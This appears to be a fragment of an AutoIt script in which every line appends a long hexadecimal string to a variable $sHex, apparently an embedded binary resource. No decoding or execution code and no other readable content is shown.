    $sHex &= "C8B084FFFB421496DBC602119706CFF33CCFA9A0918BAFB87BA6B2F4000106026D03055FB239C9F614AC0618271E6D1F313D67EF391E9CB816AF072261B610B374EF669E1F763F76583AC21ED0A9CB08CC443590108322D22C3C7A2542A79A05D8152B5A48F0889E8690524A55E04E20B46979AD2BAA80462D4B85841E8C460FEB20185829ACBD15C46A16B08DC3905A4844DF1DD111C6137A0C556242A2A817318A40888A84E9269710FC25C791A4A3493F10B7515800A508E88CBD969B0BBA931C0502DD6285F58A0B186AD1E03E11934EB8F0A11C05A58CB47F1ECAC223845E017C248DBDCBF050FB5B511C7529EC045326BFB7C04CC2351FD11CD66CACD093F0393036AC36758EB9632DBC1D14E725764811F0D9CE2818B30E27E554CE9703501C01C622BD2E146305049C1477DD49EB4A6712C1147D807549038FF86D6BC1205FC125845BF9D4A531B6990C20EFF4272D216CB0C5DF60C3E8F0138D123F12E04B8BC29B3F6012B0042E28AA15AD57AAACF455FC8BCC1F255AC4B58112A813A8BC07E257BF409C88E01E2E0A2D39411C4485550CE22173DB1839BA5F0580D06440F49699F700A0696B1B9D93BF2103FA46089981028D41514F0B2F0224B20A123751B568EAE73A1150DA888225815913A9B057CDD0B66600E147B74504B64D092F7F21FC20BD4717A09C171432BE999F3468BD131845423479C38178D672341D8D0C851105ABDE267F5638DF95206315A049EF13D25579F06A1B9399A81E8438879FD4B4B76E621DC1252EEAF13DC74034B51A54B399046076048A17C72C16DC24C237CF38C58118A8A6DF7518810AC0ECA7DA12602E91C61E96ECBA50471CA201630098A134BF6D008E818B4720F9A9911C5D95FC07F9D60EF7ED251C8F2C36148938538DFD1074E7DAFF656E5E2230AEDB14B924180A6362305BFC6F0521849CF3EC0A8C2D50BDFF0E1944AC1902CD892044AA6EF42B746827812C0B32550923250167B42006E5F33F1B9D8623279B860121A2F5037D4B2F00866947954B90912A4BB822CE144115D0A27B71206A14452D65A482310C252402010DA9A6D1329CC6319F528D48F061885B7C47E3F10962810A0175616DED01B9C21B1601805321BD0649F61C0410EE02DD301FEE7F367B5657BB0374B942023BC87E6DB69E2181D41411400199709ACAE1F2A197D6B42BBF3CE809E02B41022CFD310C682BB0D027AB8040C69002025038059C6DC7990C6689E0A6CE325607AB2F043B28E0147C269DDA0C001A28627D039F607FA63E7C0A08B904F3A5EBC982B9B3BB40D46BD056AE1A4FC2DC8E69EB814C8D1C9B42C714DFC0148D7D50C0B4BE13E5BC8E14567E1020D1D9185F12B1BA29BF08F82534CD1CE27C5C3650F859CDAE8D044A178935201721BB"
    $sHex &= "7037022B3F5020C701BB83C40987025A72D1B80AACBD7010B23B98EACAD989A710A1E6051B6C5902B62F9F5A1FD4B39A2F96189E05602259186F25609D061F5042AEB80342E878091E33FA876B0823E8F8A0812DAC82801948084DBDC3167F02E890A5517730D580B3A09C237C4E113181C4AB1F00008E8DAD268841A4019D18109D2D4DDB60392407629F86DCFC7C6462102BEB0CACE4408E1083D84D6810857F2934D499A728C80C1CA64758036AC720AF2D0CB50D8DD01CC9200D7FC9A532721814181013AB904C10DE2FDC11B1E329F6E90E0BC881FFDDFFA0E11E023097AB35117F5A17763D1B37DE090473588807D02D0CAFD8E8585C73966C259EA4D355F881C3D6CB8A5C145C52A0BB093D366111166565E05BC8500D235B6BA4E9F43DE1AA5EAA7DF0D002E462243877A08CFCE2039BB15BC30A28C400FF5BB1D48D3F02325A6A44033B5A62B280F34AFB6668E071BB07101908D0016F88AFF937D480D2B19B45375DC7E46D8F380C9BFB9992438E731014149C554A0E187736A063BD00A904511CE490979825C41C283725C7A628392C2CC4B1C869014FFE50020E19030600A304F01DF7899700DD42795D38D95C4520D0BD3C133B401381755B4ADFC273200011A20210086C2214AC67135A6905D790F140A91B1A294083BA81C6A58531503841835971C88F42A7ADC3AC4B7500B5A2F400945C8C4660E9A69FEC92E3343705A3228D1725B4A4979104B90777435A03EC13C3C0550BD7EB28BDA4EE8BD639E01D661BF41FCB49B9BD2BC9720470303101ADD180BA5FC1DC007EFBFF8FFF4D025B93DF82AE00629B020D3CABB0021F6D21F705A033572CB176BD886700A569DC1C5C661387185ADC01E4808641C34FD0B98B0BC8E9754B2B442DA44E080073455FC71A91D310EB1DD6F8F1C10B24B7837473004F345219111230824F0BEBE0238046713ECA6A01D83A0829773253722DD3B0EF3D0C0C5AD20A1F6D58520303D825EB4B2F22BC1A8CC381C136E5C65DD1AAADFF083482606E2B473555F1285D616BBF16EB3F28552C4DE41810FA328780234182E6456969460812EFCB1BA9D3D0FD4CB515402B8C7FC855480581B5973510C262577D9B28A5C6AD3F825D32D004AD0C11F89BA0737224F8015C4CA20B683C8E02014C244A4BB7D6C107062701BFE0E08480CF7D374E19F40F4BE60FC90F8F9170D510F09985ECC663CD127F36B548677C1814CD98B338F4C61357D617C444D6B6DB8D042308F6D8C12B863A3A21C003C9DC8DCF461A61B50BF688874D579BB3C89471050139D29735AE691ADD3211250C05EC25340C3D53A9A3FE895158D9FA1314E492442D124DE9FF0E968A206D891FF88A02D61FC5026C3F58ED0B4407462CE9252406FFF2146A3B7A927F3BFFE243"
    $sHex &= "2D21A3306BC005B2095A6DD584FFECB722FDC03FF8E950861BC01A8AD930D246A3172928A9685C492D9FA12843095F687B2832320380A6B1ACEDF422D0191231BBBD5010340A3884BDEBCEDF36719FA5950F64750BCBA313C1102EF6BE22F509DD280239C08B45A5760CA48DFE029EC0C4399B890238D6BA3450C6B31D381E273E74701F6595FC25011F6669390B750E522A41C35FBF71EC97E4E0796F77EB5D7BCB383D7349E54C85F4C4F7DAEB29DFF8D5244D85C1A4DFB688BA5238322A8ECA10BC053F56917990DA38BA06CFF53CEFD939874216EC309F19487520EF01B2513C90123C6000FF0FA82781DF0D118CD6D0E9D1E27E71339CD2810E5791529876ED80CD97A7576B709D742ACD9314A99DD621105B10AA608C5837FA6A41089F1B453B01B54E3A4BF71010E7204F01138D67A3AD800B011607B74CD900224CC01C0F94C431CD09FF4B1C798F3DE820639E0131021070006B02DAC92030A4313484096652D7591FA4892A118302201431118DF8350D1A44E0F8FF52DFD082AD981140296C46F55299DD7D58CFF5023C30EB4CF95011C24711251087C62DC422C07C2910DE7FEA43C3107DC80C7515E533A0769F7FCEB4BC2805F00C9D6A81111A394DF3250000032ABBD2013AA0BACA23248BC1B18407A311E5C94D9D00567F3C900F6824F40C2C13B751393C3CA52A5BD20E0097085490A6B916990875B5C1116DBF76601D52E710036C4F3C104918055C17C04648E75481A1DDFAD6C188A3637AE27FCAAC4AC1E20C81C2DE1C150D7ECBBBE85A0001D6D538451D32F03D2CAD53A53F0C1D420F25607D35255C9968649B5C1195A06E65E3147719013017BCA178C10BEAD00B0F26B726BFB2A1FC428DFC185B28FAFDAD6988C0245F5F4004E0A1D812AE941A206AFB38514A4F9BE49616592B120E8D0F046ECF4A33AD8DB324DCB58CEC73DE614F089D4F181BAD14856C363A7BE006BEC11238BD8CFF24DE8591F1074FF759A75B020AD6F3AC14822F69B0990690E4ADB1E040B9DC250DAA08DD9D9E04DAFF6BB22E1988DC1F251BFCAE497CCA9A3B685E01FF78FEB622D83102DBFFF162934F41E0DCCDC0FF99FDA2B09551E995A730074B39E91D5AB16330D2ED01ED011680E02E11C911CC2DE5010B4737F4902BBF956D45914FDBAF2A3F3C4B588477818F370D4284AA8F59119F01CB5A4DC0E561AC4AADC1A9840590387F180F9101FC072DA081530F8776329E8DC63101416CA99D045641480F0DF8008ECB6702412D80338C3DBB6B2EA4DE2E1B31B1FCBDD8BB642DEB6D8FB1BCBCD801D62B5789EB41838F2C40E509A92B02299C1508D9B6985D8559F33CEF307F408C06A5BED4DA799ECDEA4100162C1808CD26EFC001010118020F03F9AC18D0423E020220030367E7"
    $sHex &= "EEBD040508051A020A43325D0608C34DC2B507180623DF1422F02A0626F9358CD2F86D2531CF18897316364BF3167C6F01DBE57F680481181BCAA708FC18A55B8D1A62FF9B18153BD0C314B5FBA713C682833F29832B76903F277308193B3190CA14149FB589D3AD0C8CD147440DF410180F8D026600779DA5062954016491888330D0FE5A13079297CFA5646851E28F73005B92EAEB06C71028D0C0EE01E52074392930D526CE556B236D818D960CF4A742E55A05E397275283AB0AD668DF5F04303A083D102F2CC212D04DC5EA549D754C74BC91259C9887621D482EB10243BCF446A708272D6BE044A17F83B8E2A0B35D19EC4D16B92804005E3E0A0644E4F1605CA0377FB52BF86B345ABD9F686D61B40646611ADFF0E7D00E7704916A9733EBCF806359477FF8FD53051CB76F133327128C064AA57FF52E9F0F710C0274570017EE05AEA361822F15911017A8451C419313F7060AEBF42D5069810A9C423C2D1C283FB56A4D912D6E5F207C1BD8A7B56D20C9501904751C20D5B50F4FD6942AAD7FA069393D63AAF1D0ACC1444C1891008C4AB1850800D30D1C40C2197010F10F8A451C8842011E4BDCC050131413C322025260A57FEBA03091B3FC4718CB437ED70CC5806961D4189335F8F576FA14DF996A4CD156BBD9DA61A5250A20E5AF0C3C924DF0FB018B45F028979EA1D4669A253C062A1820BB2480EEA45BE586AE22079960C5415F506A449B803501D34F5D4A60F7168D45B0163831E1713BC08F0F22B27169FE2E1B50F77D4819022F0C3497E6842111B7488F965EB8B933321046E1D27C351C1420A406960B138E24EF56A28EE8674004746380D35C9A28282C2C3519642867F8F80AC50D07833128071E08E0DB41DEB04EABC1042C10D32A4B23406DE147E0532B1F17D0131189C10F84DFE84DBA19491089488E238DDA2C29E2104209FC61991057EB536FBD1B7073AB0E3F5800BC231818091B954269B861F03BA98471B72DF0C40C002FA735A5D9DD52F96C0DF8F8D494BCE555612A1C2420385160D704399B486D5A74CA7A23BFA7D9C15EE199CC43B3377145C815BB765FDC937A63CFEC5261380CF19BD0823FDB08C67BAD1679557F247C065D4AB911A400731CB2813300FC408080F7D995C416D058D9C908D30C601F2A60C5C04E114FB03EF54A354B4E815869242C719AA8F8127014B92B8B981AD4921ACF144158890D07E9D2804978FEB902EA4534BD0F623206DE22112B29836AA9C76BF877149A8415C077C1DB30960A6B04A12B8351A111327FDB821156F2256A0C9F8C5CD6827667C012C41173820A2185DF23043210BE811503431304175FB6272E7DE9C125460E8F2C1E9137B0C11958E84104CAA4058045431F0875BA242D3C4A2086712F624CA9D8FB"
    $sHex &= "61909844A1E3E9C18203C79F441B2A787FBD1822249347C46359022EBDF80CAEA6603283BA366CDEBA6197F651E2FDA21FCF142549010C504A5F1A918C2128FFE422E0D393C512A7D24398F079F0F48A8033801A333E88A6F26AA84CF8053CC94710611F5F5233217C49E0A3FA327D17A20811D5EEA76D6CCFD0540CEC58EB152D436064E407D05C60688B14FA19A1AEB50A23459AC03AA499479F16B059FDF30F814DEF4EC168786C950A3E4C0BD36C2CA5E4AC827BE8735E51366B3C6D34B0B1A528F82086737EC2250F8D90EE03C87E8BE050913C2BC4E013D008076AE44030B8309D161392A5041CE2E077C62D3870B9511FC4EA6B5995C216BC0749E84C238007C1D1D80BDB28097DB11F4C6A3787E4FAD84A1C4DEEB60E470218259C4BC086CE14E5E431D529638D8D9F3709488935A92D25DC63116714240C35A427208B2809C215368DE9183223F1C5EB43FC1E93B0E0FFC1507D85F4A4119F0C4F5E3003A01AA278A266E590D240238F1C53C42532134C679DE9818BC2FF5AB3200A579A9BA755BAB2752D11C24819EF09BF4B1829089EF4249A022DC28ABF698FAED38046939A8D485C3F1C212F462F2E7C24AA48C291184DA3E41544E38BFC6A496F0A7F8032534C157E88398C9DB583E9BC4075518137809334856AC080F20C8C84B8A5426972803A845C84AFBC03DA8A5113808850136A682650A7358BC81F5C4BD851012E2B05312350E1046190F78C27057A84064B1927906A5C438C27840A8C826CCD5990AD95BF0D3BA8D3E4EADAA071AEE92820253F18359B1800F803710CE973F8889031A2DE27948BF80390947F493C4BCFF53A3CC82DE38BE510753137A09B58C00456144B1F0E25DDAA5229785AB873E952334487B392F043C652EDEB8FC3C9B9D5C09DECC45B2B00970EC0D3E0F8405270EE6291822F2CAC9469A360EC528545B52902EE0A1C9017112CAD55AB7926CAF737A879EB165AC780D60157500B11C6C05358DD7F44580F07784B8DA143E2016B2A49EB7F20630D244EC0807DC0981FBDD7DF74150A990F84158C129A1756BA08DC471B9FF6E2560171378FE88B4540298202381C031F2E5A39D88DC3F1F00B530692510F85AC19A4FDCA3B2BE488E0E03AA02574E0D118F9F80BF72CE228982126CAD1C25DB380B7471A7F61D3E4394A089D31EEDB47C2195648140F8C31BC5D28059CE2EC2F2F7CFB83085CDA3C12E08C4B463C840E12ED00C243C90C351508E81AC0188B6CD606EEFEF6279A514812B6D75E4FEC1C484F22424808DF78F0128A410CC385A516C62687F85520B01AE68071E08DA4CF630CCA1608856590A6F8DCD0D03DE0A41A04D8C67BD0D0542AB63B407D4368D8CCCC4623C4224FE2E417997221F31D8B45CC1EF784067528A45209C6"
    $sHex &= "B01E36A3D57021E115661B2B8F7331043C0C35F805A00B08F72405288582AE9A1C88E07A18105BFF5364E913BC5C585612F5AA5BA035F160AD65C840B81A4C2FC8C43321D7CFC8E7E22432D52C202A172202CD8B17E93381C9D9FC24643D091542E8478A770B89492849884DC7A35ABA6024B55EB80C6EBA1019B7501B374BB8E9F687EC95EC4D01292AC88F077337700D8D0CC93E21A057BC07BCE1EC140EBE3AC754BCBBAD3235220DBDE34229A08E1105DE77030CDC6034311D22908F871F4144D776449FC48E7B44EB0A3863A91BC0289AFC1E0569716B112DFF34D6297C8541526468629F109FE3968097BC59E5680581F40934A983D680C618ED471C9AED823410AB7074FC2690D800FF4BBBB4B48718FF9269DAE31F3B58D7A01056217E78130454111000306E6ACB34C3DC218A17EE4A18043B16892B7B34DA05FE4C0210893518C105C48B94E69DA05248283EF422A65EC1806331EB62430827EDBF60316BA93680336958B3B3703CB0427BED1DF5D0E522ABF8885022D6F028DD00265380569A3A5885BC4CC5F39B9414F0140D4A8014A6BFE54C2AB7973114274014CEE1C0451B6A30E12BB108B509A92D4A1422F0353F22747A117BF8D26002A7A53BC2250C069500ABCF216C84D33AD26C3BF68AF46444622F35CCF7408E53C01F0C62975D6220C78BF57F3489956D0D921AB9E07726B427ACE49B508FD6CC8495EDAE7C3E7F4A1AB9C87630CD78B2833B5813380246BC8E10360B43A23198CC2310BC57B59B78201FEFE0D032A48981C06F06142012FCF4D40E0F8717032D6D41356BD4095D54AF3147B8C7C10618BBB8C3A8F112AF100D02D248B5807916DA7AAB337B7C0F8D9A7A8620CB256A4BC7D43CA969484C3BC08193E8E840003DCBE8A50680EE4E4BDC1B6A04FFC447A378A405F9165B420F108362063D2CC92660141FFA790865CB88C408A9C2A629604F065645002D6024A589ED923513C8328395EF18BD0FB55AE8362F5FA0221BB9291EEACA7D1FCC9FE4C1B954C34BAA305A5D08192C19297D09411ACC5A3EC4476B21F9D0CD11C1D451072E7C11B57A58E08015DC1A066128A3B0DC1C796114DB15F2B5C01B0A4DECB3B442BEF1F43A83EACCD200384FF8A680C4569D912C3CCDE717DC8B55DC1C0B0EB5320CEB316300E0FE0802B704742144893B24A731BC00EB366E48D9E2234708807040685DB8055D08FD21C1ED83EF3010EB7609C18B5E30348FD89DD8B948D716B2BC186A49F724219D8A5898C7300423046D2C1BBF1A0A0A48270BC6536E4A3073116836DB7BDB19065A230E3006020E5C075BE05B4EDA7B28270ED550574807ADF75BAF0686FFB020B4590FBB77B19E07371E254AFA741A0AAFC0DCC4F6745F144F387C1E44E04C135F8A4709A1B2"
    $sHex &= "2E69F9B0C8B86AB7F8DB5283B5B6E10181015F69C24D67F2751585AD35170F10C656F2C1035E67A8A0C540550F5B18DC919B3642E823A16319EF0639AC2A1C43D68DC0B602A372910B5A011F30E3B0105F56130F66E83E52F361158D35756DF5C97A09BD27058D50DE27EE8048FD64E8F0C1D893786B6BFAEBF04EC217C98E23D716C15357F07512C558762E41392EE4F6751EF645059C751FB3EB5246FEEE97D0722810B04801EB3833269506DC750F2C25103A04ECE9FF05B7B5993EBF9FA8B843D008D1638B4E0208C74FE7082109BC743C492F5641B0BA1EF7BB6A0116938814AB0A507A12C088E71470DC80007FA68640D971596514E9A600813AC90C86879CFCF841A1FC08EB3A6844A5CCE9FF14FC0F00585D3B4A107E17A92161269739F342087F0027618BDD230B77C2910F8ECBC74C4E3788AD128B4F62694CB904DCA908D7D68D8F39E202805C903E3303CFB83035A280659C581A1098F874A0847818879E72BD02C6754F2338834538CDA4F0093A114A2B04635C187EFC61C6A7BC2383EC8B55F07C4803F454D0759D0C3AA2F0EC563A2E072B2CF80360CC311B1708ED563F3636805AD3A411C0CC7B01D7F424E86E6C1C7C4D81B9FC8AD8C01205B9C1E102208B759B34FB73203502BE5F11B9C1E8023B1C9551B9818D1020CE59631AE70491E814034082DFB3C48A1DDB3B447F1703850C95846ECB63D9FCC0C31B7A8803FD63E052C67016117D33304C064AB70417D586E5A41418A39D1D843A620B621FA97409488C2020AB35528047965ED08F05F1407D78CD2B741184432314187535C35599388F108D41E0291324A326DFA5481E06102F61240A585BB35D251E4C81556BC93A0134202005AFD724122BA7A0B9018B18C335D2A96DC59FF4EF62694A1C841B7C1269089C849114204D612616F016F1750E2708C5AB057CEB132BFFE7DE60053636297F46493C2518D560E02A327F56112D1C386B0264AD534058313B7A762005B7F30B09A15089CA3A5C8740640E3D6EF63CC80472EC8801755D683F80446A68CC0969B8D7A111061DA00BC21D3F890CB0A27E92B80A09695E1BB8E4805F383431F9691CFB1CCCBC7D8581A7D2A3EC8D54852B134E426F89A764018AA7BC026705ACD02C42B441F52146537AF081FA767612B87327D2C80010E0406BED67DDD1E0A7030D3748DB3AABFD1320225F83C101E6192BE0D99ED0FDA6F52D0A548D7A9A21B4C5E0B3023CACE0D3551133CF91D851E6E03A65D84ACA3BF66A64FD4AEC2B4DDC6654E02B3608DF6AC0C1FA7CD05D2BF126D015FCE0528D14147CE88D4893DC41DC3ACCD90E2C83CC08CC3B7277DC9612C631D4661CB41441EB29E191ACDFD1D408C06B524AE8693B0AB86CE0C1A65A1FF25CF25CD014D40CA21EE35C"
    $sHex &= "D86E65C01A5C137A89D9D242328F59177AEC478C4898830875FFD006C086B5DB67205D910524974934CB24E023FD67D3A29BC2D2608EE8C323F1B12D516FD1B0B2350B372B734F8FA380278156BC7D76D3A78C1D55FC044A3BDAA103A78D7EB69D909A7299A07636E8118D3047860440C8460CACB02F9DCC10E080948E04B57F03815BC0DF6228055C457193C0258F5E7B51747CCC7E12E07688ADED82BFF0F0DD38A2AF50342E47A09E120AFFD5935006512542B324BF5DF88B51449F2E04A52D4E55AA82134753A9298AD25A2F624F75250534CFB5F070348BBCF83D46B810922C9FC432AE8083FC9D042CF5ADD556A8504AB72B7203EB9680637D2D967133480116B4103A54E191956A20B0F776E969DF8DA15345A03EA0296B177BECA86689EB79FF0434CDB521FBECEC139990EE91EB74F5EC0464909F09EC01527CEC90991BC08D2ECF48247CDCB69C7F555644E342D32B0DE035927B05EB713189D1BF39FC5BC6E09629C9186CBA6D4663D01D451C3C8DDD7ECE207D425C77585F7619ED4F991857F843B8EB448AECEC018321E8798B0B0E920C40CFED6B2165778A5C8B291F7072D9A1875F70B6840858C8A51D2534F8986CD418D6A47D7F245ED260BE34FC56E7364156B5FC24A10F9334B8DBD264CFE680F6C3709A916C4E476D8D95E0FC420DDD0F9652577C8D8523501B702796858983BD0BF6C23D48D68D117768763ADE8174BB528B5DD159F0E140F56D7FEB6B1CD0FBDBE16CDAD9B4842357D907EF9DB2CCFB0AD91D954F4805906C6C7B6539C16AD98A5D85B0EE181DF089701D10416A82C211EC4BF056C3C5619943BD23EB6012EC790FB3E16603A611BD0A0E7615402FEB3B110FBE940DEF015C40B9674D38D359C6840595286C752BC9F178AF5606566911B975B84B9D69DBE83E9511E05D2C74BC0FEBC7A504930B5A511E17C0047E908DE057AA11350F73289A0D37C68D56503E86F09C5A30C9093DD67C5EB624B14FC60294BC06BEF9FC729265C6C4AD7F8D18086922BC2743342E0817DBF8CB6200A6365B1223432682F5EB35F1C216309849A247F58381CDD1C90401E343C254FF512CAD8441681460213169DC844EDD3DCC77AECA58109F4523D4980ED48A0C65F55695888CCB2900392032DF0869A12E690CFB9F6221E490100C7F631C30107F16602CA3220713B816961E6FEA9734C5D4174323B409173D8AB8158E3033841A42E560C2EB3130B0CE2E8CFF5C0A2C140404A2DE6E2C9309B895FFAB7660177408B195767725D3D908132CBFAFE0D03792430C969A5C21F8D94A56590800306A0E19B107230B59295F47C9215F106A151507A0941CF2FFE46A0B0B7EE369013F1D3AFB201A3AA714796D9C10E194F0E61401E93A006175FF7F220028467A0C193E"
    $sHex &= "10301A7D21428A42F402A810D6FF895169D9ED9459C5404CCB9808326A8310A50A0B387E1FBA4AC226B517407BA63E92C3109914ACEB788892FFD221528D10AB87DD0B4D0756300E38F465BFC1C7931F1E998CF88443E390EF0878EB18BB33888E91C2162FC1F4BA04E520CF719AFA23B10E3B087D3D19F884D0290C75FB8A816B1A0550261D105BF71496BA3CD1003E40DF019A60558C6913B01A7A311C471F2C56103A32AEADF8C3396904E12412690128D57D2963377D2C26BC028007853977FF053C78D3831081E2819420241CA1A0C257B749E015F147855F2573B91A7D143112E8A433AD14D8ECBB8416D88182D8E70B005AE41802BC2E436CE225EEF1DF500744D6EC67E08D4CC2309A2AE25A9DAFE4252D3ADAF1181774B52036D6088574AB33300BCB0D2551EC6BC041E11A0F02B2042E842761AC6D2EE445201AEA2CE5E40D99E72CBD32E8F934F08409D8004D90810FEB923B25682903B79BF48C99651C9AEB61E183C6B3D199B021CDF3AD4548E19C5A935AFC01FC01497E1023819928D7C8DE4341FC9DF68A4910882404E5DCEB820094270843E07D3E4FA04A17FB620AF3D10EAE842F54E8D2D08C22BE413D2875E85898B0D904E8D6046C30400115EC5EFF9CA00F6D30B7CB48F804716AFC9542A5393813273CF4C83E850F4735CC68688F43A72990AFDC5C8F970AE2D6429EDC7B36E9FD822E2CA4CA228850108F8846A4DCDD5264B6943649839F2C208DC6B7D6C87AE058FE49B83B4905A4AC8442969859BBBA17A1B4B3AC0CD46182BD89D4D2500CF7D2CA7E91F58AA9E07FF88B55E0EB760054E4CD27E4F0C944237FE473F1C18707A28B0BAA84E5C1D20F91E9E465900F85260106EE5527A975F5236860244B6861DD93A77C18F29B46F533004B4088FCFFC4EFF59496F9208B55E4D23BC451E83A5410435500C7B0033444E1BC503F45309DC6738527EDBC0B810DA94D43D34A835BDA7565ECAC9CEDC0DC5D9AE7AC83C1ACC0C0942810805B2CA87D3626461A0DF4FB513E9D1FC9D203EB280DF095893784D938B00B55B4F97074A7F0EBAD062355B00C238541104AC8B006309FC0C2E177BB71ECF405591C347821E654F11B3E4C84912D199C8E67523A31BAE4D22A9D48D7E09CFE9C4BB73553A0A479FBA017ED1591A46383FA9C1055A0F680C977A05AE84EA0F460A55BB8234D7E003475B3445C3CEAF424829530991E8BFE8A640B55BC1B4C3D012E6CC59978E9B60A173AA68AA6BD1E19668C56E8ECE46CA291CA2903989431900D6B19AAD98C298CB18C8F667E2118020F8D6B1298C010B5C0836105E0BDE4772D23132027EAE44F770C1F657C68D3BF30C1D578266470FA90AECB21385C0DEB2308589E4CFC26E1893705BCA7FC170B856896835D055AD64A"
    $sHex &= "947BFA908E80DAC6187C2C2779B0C6AE0B368508278C9500A146600500E7233BF22233A2F3E1BFEB69C708A302D224944AD7A3F2E498550D022A0CD71E62450FBED0C88855514D9BE6DF2DC0E48488EB4CD21AD788888410C1A6464FD9C84AD44112720A7382EE78FA0932337C01B8BE1212937CD545308A073699F80F66502E9FCDE8E4F75AD2C187C3C7E0406EDA6AD31A94C2991CF14FA61EDBDB956B426CAC7AE3B76963DD42F029BDE280EB8E2A7A5B69B5808D98956A4853A336DC1259EAF2902A57EE82C8B2DBC86511B6009D4757B29E4B97706A47D0A5B6033FE1C39A06DC6B9270470B5B1C30AFCD9C4C2D570B37C4D561263A8C7F1830CAE6C64213015D27B5C03CDBEBD25349616B1F5010BF34D85A7D5A851E3CACD0EA8136194F30E7C42E16F7AC816EFC22F1A1033D7E6A6A1416B1742A59751A03124710D261692B00983C06F031B7D44BD2244DF47EA0C4344EF03D06D44AEB52213106102F8018F707C98E7A0C621EF15D6142E0CEA81C59F7B05D6B97D67124B04C2636F4D0564469246D3458841281674A387F59185635D301E209D2429C5BD86D620036BD475BE798D62446AEF60EBCE4D0D493E450E5F04211619659678DF0E25ED3B8173024A400D7C07C32307EE0645CD318E03F05405969F5E0400127DA208D7F0CD466D8B1C1802BE8D488C6BE86209E6239DC6A0664A693D425D6040D17F710C221AABEA4746A3E9B09750398066C745E274C956D97FE0CD8F711F0BE2BAEDC7D446A076403F8CC464B3A950C302E4E8FA220106AC60F4BB520644B4A071DC05C016201C0AB041C6B9A369645766306C423D1AE7F42066BECA0028C441D032CC07B4DFBFA7F16AACCD06F2CD46963DB88C5EBD68FCF1E11E8F5109A7E0AFDC640FFEBC1C602C813402A36FF5AC644081701E97CF2E8FC20D3D8D0C7240137AD383F3144242F455821C20C02203010DB10199F40B8F364A00C10861488B8B94AFDD4580C1C1225F9A5C9C25E27A36CBB22A06000986037C706B9C9D6F7F4F48EAD292283FC934B9BF4B47A8444119822A4B0979F248DC4813412852BAB8C4B2A6F2D64A23004156E2D4C057C0DD018753E178E07BDFA0021F08B3C580F100B18960A8CDE06942005F829EB9EB3111C11374A3289041769765545794B59A2A16FCA43E64F2815403F3F33F55C496A1F1051C2C71446590163B64BA158C977BF011940A66B394ABA7542BDEF1409999ED0ED185A0593D3E993AC13086B22541FBC256ADB0223187930F8787BC1B8D022212793BB24E0E58B2042D2200068FC23A0031EF8D95D25C11226D9A41CEF1C10033C1036251201570B0DB41613CDF4346BCC04702A5F829F9BB836B40C794C6EDEC2E7D368BF7D08DF300D7AEE62EB56ED29A911F0601AD66B"
    $sHex &= "D115E914BE25DC31FD7C833B6C18133969C64E90BE00030D3B7C0942E8514B926B1960B1410C060601980C731D56202DB0717341B84A10FD1B8470042EE3A3A9152D149D61D2EA908BBF3C0C7C01271D711A5C676405624A7E5D46C6951ED773BC62154E13E985834BC4367024C6EC05C463C00CECC13BB8890F6A468DAFF46911008C34FAAD40FD8612E118BED557AA53858EDE844780DE021EC1FE3EC69956F9761A54D0EBEA91BA492AF0D0664671DA49D7035D2C406CCC002E8993FE48CCC1AED29215D4CC1D7C14F4244CF04ECC293BC45A295A74D0C424EE3036C4EE38907D84F03905F0EB4DE79E7A57008E1DBBB9C4E1DAC3EE3C7F4F250C142E28DCED027600B025E84D40C34DE12E740DE115FD8869C2C351F98529757A1BDA40B9847DA1D881D9171325F47D7587D8D66B2AE8CBE0A20AF1755308188986D1DC7C07075DB8FD8ECAD18482E6924410C81D504FCB64BCABD8D6861C31B6CF781AFC200E1A85A7896183151EA4B3361973B0378010D032015C2C78EF441401E72406EBBAD1E0C14A090B48EB875A5891B18D3A258435DF617E26C9AFCADD380674061AC4EDA0D362367408573F071EA4C532257B09E0DDC48FC038A800600AD71BCB42A3493B3846FCFDF02C725038E3F8F6470200A8B5B0C1E41A3812D8BFAB2BE812F0501D79B3AF153336BE20F0E74724B8461BCD48E15CB1E20B4B4F12891C000869183BCCDE092C5960ECF02B886C53184510F1D6DA295C678A7D650390C09DBA18208FDC0B3ADA5878D2170A78EA9BEC016958FDA2853C492E4E32081F813DE05087804BBB26DD708BF00F113F43894620EB87210E0EBA25062473601B491A6C1DFB24495D08A303886159487F161070694415181C005E4B6EF400A2DC600DD805ED41E769810DE78A40421C004B045EDF27018F204C59FA5A5D839EECBE20557AF199D0ECEC8EC2B36123AD1A1EB252B81B2C7C235CC81B09E479C0CC184B1A9C0434E160221A0273973AD70C9E97E3DC1BC450951CC8C07D7858F49347954087B413CC347A05F69F20278F100375B33A1270D501F314474B2A581533D49F1EE9369E477C8DE882914495E8C032548FC3E457E4194DC71722077D5968E4037D4D6B2FB1510595754240F3756C1FD0E403A23E5B13AB510450E0033B6AACCF171583065C514608BFF898BD369A1E06C87AC9B280BF06629588A40B40E6B7CB2183FA217408963C89BDA1404BEC883BC2275C0E3AE0E093E0D6253B6C03E9EC8C18F3BDBB59952BC5E1207423B5186172497708741859B80810105864931F12C3301A5D9DE1109520DC5E017D4BFC44D007EADC5AAAEAE097F1C26CD9B99426ED8188D72F3010E0C6FE0207EB001BC4D5422C38F1E5EE02894F5BA9A3E17C24243A760BDB1300C6"
    $sHex &= "4060DFE8AE52018F8F2C0199FE142808CF246592C4465B4F1240AA03ADEEBB59FAE36CE16CAD2E05876A258CF3AA101034B760F0467CAB1702C1F751C813C75D8F4D6F2EA491D26B5ED1126B434AF730286C365E29E39425634702D65FB3B70B2958111A05B3715842393B01ECF9C640F24D73F36134AC36BA452DFBB88B662D58286F1BBE8DC0B255C7FBDFD4EF148C141BEB598E4BE08DA704D35CEBFF62C94907F7E0421316BF9FE460AC4ACB08A7951252DBC3B533506F3388C5C128B7118B99F15FE861CA9DE85F92369AD84DEFB55118C6B4F5F38D0A412F2BE57B23782BAE31019B23008DEDD64814882FC66082DBC117DF84C430EE3F249DA4D609631E2B2D38F43271F8D88183B1A88F18733503AD5564A10CD30877045C1A265D0C253C210DA54C11164CC243D612D2B9F2C6D202B8A4E0194024551D0212438EFFB501C864E15D8CAB8B82420ABFD991585203386B009FA43C450201013F11C0B8ED7C37820E9A02E79086A4B101A463490C2E4D878D53EB360018F870ACCD263D4598AD24D607CFB31809C44A19598C246BE3F1FD87AD9BC100855D56F511D6072D7485499D76173E0D741885D23A3A28E23E2C4B6CAB0B9F7E2D02753A152F1FD650C0B8EC88484DD245D612723A44C62444F7E09BA2DA1E8FCC09C7D368E0F6CF8EE570F53BFB32EE10B0C19E592215AA81A58FE0AD5D63438DA2908CDCBC2F6C2EDCE1D0BD642CAC1D1C8A1B737D6944C80DB9192835384A23E46D381818B677F71C10D0D028FD1B5CC21D9809C316E47704341BAF4CCE0C8EB766423A31067A638EE7019